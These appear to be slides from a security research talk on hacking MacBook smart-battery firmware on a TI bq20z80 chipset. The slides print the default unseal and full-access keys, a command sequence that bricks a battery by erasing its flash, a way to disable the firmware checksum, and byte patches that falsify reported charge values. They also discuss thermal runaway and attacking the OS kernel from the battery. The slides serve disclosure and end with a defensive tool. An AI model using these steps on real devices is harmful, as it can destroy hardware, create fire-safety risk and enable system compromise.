Battery Firmware Hacking
Charlie Miller
Accuvant Labs charlie.miller@accuvant.com @0xcharlie

About me
Former US National Security Agency researcher First to hack the iPhone and G1 Android phone Winner of CanSecWest Pwn2Own: 2008, 2009, 2010, 2011 Author
Fuzzing for Software Security Testing and Quality Assurance The Mac Hacker's Handbook PhD, CISSP, GCFA, etc.

Something different
http://www.youtube.com/watch?v=jjAtBiTSsKY

Agenda
Basics on smart batteries systems A journey into a MacBook's battery's (lack of) security mechanisms Potential impact

Smart battery
"Safety is a primary design goal in the Smart Battery System specifications. The central concept behind the Smart Battery specifications is locating the primary intelligence of the system inside the battery pack itself. This enables the system to be much more accurate in measurement of battery parameters such as remaining capacity and design voltage, and also allows the charging algorithm and parameters to be tuned to the battery
pack's specific chemistry. By relying on the battery pack's intelligence, a properly designed Smart Battery system will safely
charge and discharge any expected battery chemistry."
- Smart Battery System Specifications document

Smart batteries
Have an embedded controller which communicate with the charger and host Has a responsibility to maintain safety Can be configured for different parameters/chemistries

Possible Battery Attacks
Brick battery on victim Reprogram to remove safety features and allow explosion (thermal runaway)??? Persistent DOS to OS Persistent backdoor to OS (requires kernel bug) TPM, BIOS sniffer

Spoiler
I didn't blow up batteries Didn't do too much twiddling of parameters in my house Would like to continue to take my laptop on airplanes Might be able to take this work and do it

How to start
I suck at hardware, so look for associated software

Battery updater
Lots of calls to a function that basically wraps IOConnectMethodStructure IsStructure
This is a function which passes data to a driver
The driver in this case is AppleSmartBatteryManager

AppleSmartBattery
Is part of PowerManagement package source code available, but won't compile missing many things, but lots of nice info in headers

More battery updater
It does things like read the device name and compare to a list of devices to update or not (DeviceNameCmd) Read and check firmware version and pack lot code (ManufactureDataCmd) And some other ones that aren't defined in the header file

One odd thing
What's up with 0x3672 and 0x0414?

Google!

Double win!
We now know its some kind of Texas Instruments chip We also know Apple used the default Unseal key We can verify that Apple also used the default FullAccess key Thanks!

Which chip?
Its a long story... Each chip returns slightly different data flash lengths for each "subclass" I wrote a script to get these values and then manually looked for this "fingerprint" in all the TI design docs Eventually found one that matched
Note: I really don't like to mess with hardware!

Data flash signature
0: 22 1: 25 2: 10 3: 1 ... Behaves like a TI bq20z80

The right way to do it

Step 2

Step 3

Lithium Polymer cells

Electronics

Step 4
Chips and stuff

Step 5

TI bq29312

Step 6

TI bq29412

TI bq20z80

Another clue I missed
From AppleSmartBatteryCommands.h
Sigh, I suck

Digression
We now know what kind of hardware is on the battery We can get data sheets for it We can see how to talk to the driver which talks to the battery What kinds of things can we say to it and how does it work?

Smart Battery System (SBS)

SMBus
Communicate via System Management Bus (SMBus) Two-wire interface based on i2c Format of data outlined in Smart Battery Data Specification

Mac OS X
Apple provides a kernel module, AppleSmartBatteryManager, which allows writing to the SMBus Access is not raw I developed an API to document this and make it easier
Releasing it after this talk

SMBus API example usage

SLUU276
Document outlines all SBS commands Documents DataFlash For bq20z80-V100 + bq29312A chipset
That's us!

Lots to do!
There are many interesting writable configuration values
Design capacity FET control Design voltage Device chemistry Cell overvolt threshold Pack overvolt threshold

Overcharge threshold Overtemp threshold 2nd level voltage threshold 2nd level charge threshold 2nd level temp theshold Impedance table Temp model

Twiddle-twiddle
unseal
I played with these values but nothing too interesting happened It still stopped charging when it was really supposed to do so Needed to dig deeper
full access Boot ROM

Different modes
Sealed Unsealed Full Access Configuration BootROM

Sealed
From the factory Only standard (not extended) SBS commands available Standard commands only have read access

Unsealed
Access to Data Flash space Access to some extended SBS commands Some SBS commands have read/write access Apple battery firmware updates enter this mode

Full access mode
All SBS commands All commands have read/write access Can enter BootROM and Configuration mode Apple firmware updates do not enter this mode

Configuration mode

By issuing SMBus commands (see slua355b) you tell the battery what levels of current, voltage, temp it is currently receiving

It then makes internal changes to align itself with these values

write_word(0, 0x40);

//enter calibrate mode from full access mode

write_word(0x63, n);

//n = number of cells

write_word(0x60, n);

//n = current

write_word(0x61, n);

//n = voltage

write_word(0x62, n);

//n = temp

write_word(0x51, 0xc0d5); //calibrate device.

read_word(0x52, y);

//y = bit field, whats calibrated. (poll with this)

send_byte(0x72);

//transfer results to data flash

send_byte(0x73);

//exit Calibration mode.

Other calibrations?
Yes, I'm a prodigy

Boot ROM mode
Allows low level access to device, direct access to data flash and firmware bq20z80-V110 + bq29312A Chipset Technical Reference Manual does not document it Time to buy some hardware, sigh

bq20z80evm-001
An evaluation system for the bq20z80/bq2312a/ bq29400 smart battery chipset
Almost exactly the chipset on the Apple Macbook battery Comes with Windows software to interact with it via USB

My test rig

The software

Read/write SBS

Data flash

Pro
Hell yea

Firmware flash

Raw SMBus commands

EVM
It can flash the firmware with a "srec" file which comes with the kit Need to sniff what it's doing so we can figure out bootROM mode and copy it

senc files
"encrypted" SREC file Where encryption = fancy xor magic
SREC files contain Some header stuff Full data flash Instruction flash Checksums

Introspection
Wrote a PyDbg script which intercepted data before going over USB
Could compare this data to the raw read/writes on Pro screen
Interpret data during reprogramming

Some analysis
SMBus command Read word: 0x8 Write word: 0x4 Read block: 0x2 Write block: 0x5

Google again
Googling these types of commands, numbers revealed the bq803xx ROM API v3.0 User's Guide This documents the layout of the firmware as well as all the Boot ROM routines

EVM Programming SENC

<Version> <Smb_FlashMassErase> <Smb_FdataEraseRow>(0200) <Smb_FdataEraseRow>(0201) ... <Smb_FdataEraseRow>(023e)

Erase everything

// program flash data <Smb_FdataProgRow>(00) <Smb_FdataProgRow>(01) ... <Smb_FdataProgRow>(1a) <Smb_FdataProgRow>(30) <Smb_FdataProgRow>(31) ... <Smb_FdataProgRow>(37) <Smb_FdataChecksum>

Program 0x38 rows of flash data

// program flash code <Smb_FlashProgRow>(0002) <Smb_FlashWrAddr>(0002) <Smb_FlashRowCheckSum> <Smb_FlashProgRow>(0003) <Smb_FlashWrAddr>(0003) <Smb_FlashRowCheckSum> ... <Smb_FlashProgRow>(02ff) <Smb_FlashWrAddr>(02ff) <Smb_FlashRowCheckSum> <Smb_FlashProgRow>(0000) <Smb_FlashWrAddr>(0000) <Smb_FlashRowCheckSum> <Smb_FlashProgRow>(0001) <Smb_FlashWrAddr>(0001) <Smb_FlashRowCheckSum>

Program 0x300 rows of instruction flash

Boot ROM - mostly ok
See how to write to Boot ROM - except what's up with the checksums and stuff... Can probably figure out how to read from Boot ROM from the doc, although no live examples Can also probably get all data flash, not just the SBS accessible stuff Can see what the instruction flash looks like by recording the SMBus writes during EVM reprogramming Need to know what kind of machine code is in there!

Battery chemistry
Smart battery chipsets should be able to work with battery cells of various chemistries Settings on the device can be configured for different (or unique) chemistries No documentation of what values these are or how to set them

Evaluation kit can do it
!

Sniff the chemistry change
Write 0x52 bytes to subclass 83 (undocumented) Write 0x50 bytes to subclass 84 (undocumented) Write 0x1e bytes to subclass 85 (undocumented) Write 0x20 bytes to subclasses 88-95 (R_a tables)
Cell impedance Write 0x40 bytes to subclass 80 (IT Cfg)
Impedance Track algorithm parameters

Subclass 83
Seems to be a bunch of signed shorts
First is chemistry ID
Rest are decreasing values, presumably a voltage graph of some kind
4300$ 4200$ 4100$ 4000$ 3900$ 3800$ 3700$ 3600$ 3500$
1$ 2$ 3$ 4$ 5$ 6$ 7$ 8$ 9$ 10$ 11$ 12$ 13$ 14$ 15$ 16$ 17$ 18$ 19$ 20$ 21$ 22$ 23$ 24$ 25$ 26$ 27$ 28$ 29$ 30$ 31$

Undocumented subclasses
Try to read every subclass ID, record which ones respond, compare to documentation 6 undocumented subclasses
57, length 10 65, length 5 66, length 10 83-85, chemistry related

Read Flash
Reading Boot ROM API and watching EVM, we can figure it out Below is for Instruction Flash

Read Data Flash

Instruction Flash Contents
We'd like to disassemble the firmware Need to know what kind of chip it is for Tried all the ones in IDA Pro, none disassemble well

Let's ask TI!

Thanks...

Plz!

Go away, kid

No worries
Mostly binary stuff What's with the 3's?

3 byte aligned
Probably 3 byte aligned, in reverse order High nibble is always 0,1,2,3 Processor with 22 bit words?

The end
Ends in 23 ff ff Then lots of 3f ff ff...

Lots of ends?
410 instances of 23 ff ff Spread throughout file ret instruction?

Back to google

One last google
The processor in the bq20z80 is a CoolRISC c816 (or is functionally equivalent)

CoolRISC 816

8-bit micro controller

Harvard RISC-like architecture

Flash data max size: 64k, Flash instruction: 64k 22-bit instructions

16 8-bit registers No IDA-Pro support

RISC architecture is gonna change
everything

More on registers

Data Memory Addressing Modes

MOVE r0, (i0, 0x7e) MOVE r0, (i3, r3) MOVE r0, (i0, 0x7e)+ MOVE r0, -(i0, 0x7e)

r0 = *(i0 + 0x7e) r0 = *(i3 + r3) r0 = *(i0); i0 += 0x7e i0 -= 0x7e; r0 = *(i0)

Instruction set

IDA processor script

IDA!
Create a few small sections, one for data, one for instructions

More IDA
Initial disassembly doesn't do so good We know instructions are 22-bit, 3 byte aligned
Disassemble at every 3rd byte using Python script

Some SBS commands

Boot ROM Problems
Now can dump and disassemble the instruction flash Can dump data flash for examination Have seen how to flash entire device Consecutive dumps of instruction flash are not identical Trying to make changes to firmware sometimes brick the device Trying to flash device bricks it

Expensive hobby
I was ordering these two at a time!

Battery wasteland

Try an off-market knockoff
Actually had a different unseal password, couldn't hack it!

Fix #1
Turns out that the SMBus Boot ROM reads are not always dependable This is not good if you patch by reading a row, modifying it, and updating it Now my code verifies consecutive reads agree
read_firmware("hotel.fw"); read_flash_data("hotel.data");
read_firmware("hotel2.fw"); read_flash_data("hotel2.data");

Better reading

md5sum hotel*fw 01d2f382b8e2633032f48b2c3bbfd900 hotel.fw 01d2f382b8e2633032f48b2c3bbfd900 hotel2.fw

$ diff hotel*data.txt 1c1 < 00000000 01 71 ff 6c 0f f1 0e 74 --> 00000000 01 71 ff 6c 0f f8 0e 74 3c3 < 00000020 db 45 02 58 00 00 00 00 --> 00000020 db 45 02 59 00 00 00 00 11c11 < 000000a0 0e 00 02 00 00 01 10 05 --> 000000a0 0e 00 02 00 00 01 10 05 77c77 < 00000700 db 45 02 58 00 00 00 00 --> 00000700 db 45 02 59 00 00 00 00 79c79 < 00000720 ff ff ff ff 00 00 04 e6 --> 00000720 ff ff ff ff 00 00 04 e9

2f c7 2b 5c 09 f6 ff f8 2f d7 2b 5c 09 f6 ff f8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 01 0e 00 00 f9 00 02 00 01 0f 00 00 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff fb 18 04 e6 fb 18 ff ff fb 15 04 e9 fb 15

Problem 2
If you patch a few bytes from the firmware, the battery stops working properly
OS queries PFStatus (SBS 0x53) and sees that Dataflash Failure (DFF) flag is set
From the doc:
Dataflash  Failure-- T  he  bq20z80  can  detect  if  the  DataFlash  is  not  operating   correctly.  A  permanent  failure  is  reported  when  either:  (i)  After  a  full  reset   the  instruction  flash  checksum  does  not  verify;  (ii)  if  any  DataFlash  write   does  not  verify;  or  (iii)  if  any  DataFlash  erase  does  not  verify.

Reversing checksum
One of the ROM entry point functions is FlashChecksum This function is called twice
Once for SBS command ManufactureAccess, subcommand 0x22 Once in another function...

Checksum checker (old)

Checksum checker (new)

Disable checksum
Older: Set stored checksum in data flash to 00 00 00 00 Newer: Set "encoded" checksum to "encoded" 00 00 00 00, i.e. set to 00 3f f7 ff Turn off encoding of checksum and set to 00 00 00 00? These require a Boot ROM data flash write

Without Boot ROM
You can dump the data flash, do all the SBS data flash reads, and find where the checksum lives in an SBS data flash subclass Turns out the address corresponds to (undocumented) subclass 57 Disable checksum in unseal mode:

Patch it!
patch_firmware function patches instruction flash at a given address Reads in two consecutive rows (verifying as it reads), makes changes, writes both rows, verifies changes

diff hotel-nop.fw.txt hotel.fw.txt 4602c4602 < 00011f90 3f ff ff 3f 01 02 03 ff --> 00011f90 3f ff ff 3f ff ff 3f ff

ff 3f ff ff 3f ff ff 3f ff 3f ff ff 3f ff ff 3f

Now what?
Can make arbitrary changes to SBS parameters Can make arbitrary changes to data flash and instruction flash We need to understand the interactions between the battery and the host/charger

Sniffing SMBus
Bought some (more) hardware Bus pirate Saleae logic analyzer Beagle i2c/SPI Protocol Analyzer
Need to figure out which connections to battery are i2c and how to connect to it while battery is connected to laptop

Spaghetti wire fail

Soldering fail

Don't be afraid

It's the red and orange

i2c decoding
Write, SBS command 0x8 (Temperature) Response, 0xb73 = 293.1K = 67.9F
Write, SBS command 0x14 (Charging current) Response, 0xd48 = 3400 mA

Beagle

Beagle data

More sniffing
For an hour I recorded SBS traffic while charging with laptop power off Saw queries for:
Battery Status, Temp, Charging current, Current, Voltage, Battery Mode, Relative State of Charge, Remaining Capacity, Full Charge Capacity The only ones changing were: T, C, V, RSoC, RC

Time ticks
Voltage, Current, Remaining Capacity

Implications
Brick the battery Change the battery's characteristics Attack the OS

Bricking is easy
Lots of ways to brick the battery, here's one way
unseal(0x36720414); get_full_access(0xffffffff); // Enter BootROM mode write_word(kManufacturerAccess, 0xf00); // erase all instruction flash write_word(kSmb_FlashMassErase, 0x83de); // flash execute, i.e. run firmware send_byte(kFlashExecute);

Firmware changes
It might be interesting to see if we could change the way the battery responds to queries Things like RC, FCC, V, etc All the things queried have SBS command between 3 and 0x16 There is one function which handles these requests

Switch on i2h less than 0x1c

SMBus MITM
Remaining Capacity (0xf) -> Manufacturer Date (0x1b) Full Charge Capacity (0x10) -> Serial Number (0x1c) Manufacturer Date and Serial Number are R/W word (in unsealed mode)
Not actively queried or used

Case 0xf - 0x10
This sets up then reads from hardware and sends response (in different basic block)

We redirect to cases 1b-1c
int worked = patch_firmware(0xdbb1, (unsigned char *) "\xf3\xc5\x0e\x95\xb6\x33", 6, 0); Patching row 0x249 at offset 0x51

Result

Remaining Capacity:

0x202a

Full Charge Capacity: 0x73cc

Got manufacture date 0x202a

Got serial number 0x73cc

Another change
Relative State of Change (0xd) -> Remaining Time Alarm (0x2)

Patching code
patch_firmware(0xdbc0, (unsigned char *) "\xf6\x05\x0e\xba\xb6\x36\xf2\x05\x0e \xb8\xb6\x36\xcc\xb6\x33\xec\xc5\x0e \x95\xb6\x33\xf4\x35\x0e\xdc\xb6\x33", 27, 1);
patch_firmware(0xdb2a, (unsigned char *) "\xbf\xb6\x33", 3, 1);

Reuse extra space

Re-sniffing
Shows all values queried are fixed We can set all the values to arbitrary values
Some must be the same as others Values can be changed while battery is charging "on the fly" Changing values does affect amount of current delivered to battery

Deal breaker?
MU092X Thermal cutoff
FYI: I didn't see these on the off market battery!

Attacking the OS kernel
Battery communicates with the OS on a "trusted channel" By issues raw i2c/SMBus data, could potentially exploit a vulnerability in the OS kernel

Fuzzing the SMBus
Two options Write a fuzzer in CoolRISC assembly and fuzz from the battery Fuzz with a "emulated battery" via hardware

Caulkgun
Seal up your battery by changing full access password Doesn't affect any existing Apple firmware updates Cannot be reversed If future Apple Battery Firmware update requires full access, the update will fail

Caulkgun source - guts
#include <time.h> #include <stdlib.h>
int main(){ srand(time(NULL)); unsigned int r = rand(); unseal(0x36720414); get_full_access(0xffffffff); write_block(kFullAccessKey, &r, 4); seal();
}

More info
Tools, slides, whitepaper:

Thanks

Questions?
charlie.miller@accuvant.com

